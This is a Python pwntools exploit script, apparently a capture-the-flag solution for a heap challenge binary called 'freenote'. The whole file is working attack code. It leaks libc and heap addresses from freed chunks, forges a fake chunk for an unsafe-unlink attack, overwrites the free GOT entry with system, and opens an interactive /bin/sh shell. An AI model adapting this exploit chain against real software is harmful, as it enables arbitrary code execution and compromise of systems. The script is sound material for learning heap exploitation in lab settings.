from pwn import *
p=process('./freenote')
elf=ELF('./freenote')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#gdb.attach(p,'''
#	break *0x00000000004010A8
#	continue
#''')

def add(x):
	p.recvuntil('Your choice: ')
	p.sendline('2')
	p.recvuntil('Length of new note: ')
	p.sendline(str(len(x)))
	p.recvuntil('Enter your note: ')
	p.sendline(x)

def show():
	p.recvuntil('Your choice: ')
	p.sendline('1')

def edit(x,y):
    p.recvuntil("Your choice: ")
    p.send("3\n")
    p.recvuntil("Note number: ")
    p.send(str(x)+"\n")
    p.recvuntil("Length of note: ")
    p.send(str(len(y))+"\n")
    p.recvuntil("Enter your note: ")
    p.send(y)


def dele(idx):
	p.recvuntil('Your choice: ')
	p.sendline('4')
	p.recvuntil('Note number: ')
	p.sendline(str(idx))

#leak the libc
add('a'*0x80)
add('b'*0x80)
dele(0)
add('\x78')
show()
p.recvuntil('0. ')
#main_arena=p.recv(6)[::-1]
main_arena=u64(p.recv(6).ljust(8,'\x00'))
log.info('main_arena > '+hex(main_arena))
libc_base=main_arena-0x3c4b78
log.info('libc_base > '+hex(libc_base))
system_address=libc_base+libc.symbols['system']
binsh_address=libc_base+libc.search('/bin/sh').next()
log.info('system_address > '+hex(system_address))
log.info('binsh_address > '+hex(binsh_address))

dele(1)
dele(0)   #top chunk merge

#leak the chunk list ptr
add('a'*0x80) #0
add('b'*0x80)
add('c'*0x80) #2
add('d'*0x80)
dele(2)
dele(0)
add('A'*8)
show()
p.recvuntil('0. AAAAAAAA')
heap_address=(u64(p.recv(4).ljust(8,'\x00')))
heap=heap_address-0x1810
#print hex(heap_address)
log.info('heap_chunk_ptr > '+hex(heap))
dele(3)
dele(0)
dele(1) #clear the chunk / top chunk merge

#unlink
#add(0x80*'a')
#add(0x80*'b')
#add(0x80*'c')
#dele(2)
#dele(1)
#dele(0) #top chunk merge / convert is ok
payload=(p64(0)+p64(0x81)+p64(heap+0x8)+p64(heap+0x10)+'0'*0x60+p64(0x80)+p64(0x90)+'1'*0x80)+p64(0)+p64(0x80+0x11)+"1"*(0x80-0x20)
add(payload)
log.info('heap > '+hex(heap))
dele(1)
atoi_address=elf.got['atoi']
log.info('atoi_got > '+hex(atoi_address))
#log.info('heap > '+hex(heap))
'''
#p.sednline(p64(0x0)+p64(1)+p64(0x80)+p64(system_address))
payload2=p64(0x80)+p64(1)+p64(0x8)+ p64(atoi_address)+"A"*16+p64(binsh_address)
payload2+="A"*(0x60*3-len(payload2))
edit(0,payload2)
edit(0,p64(system_address))
p.recvuntil("Your choice: ")
p.sendline('/bin/sh\x00')  #edit function used atoi so you could not write atoi got
'''
free_got = 0x602018
payload2 = p64(0x80) + p64(1) + p64(0x8) + p64(free_got) + "A"*16 + p64(binsh_address)
payload2 += "A"* (0x80*3-len(payload2))
edit(0, payload2)
edit(0, p64(system_address))
dele(1)
p.interactive()
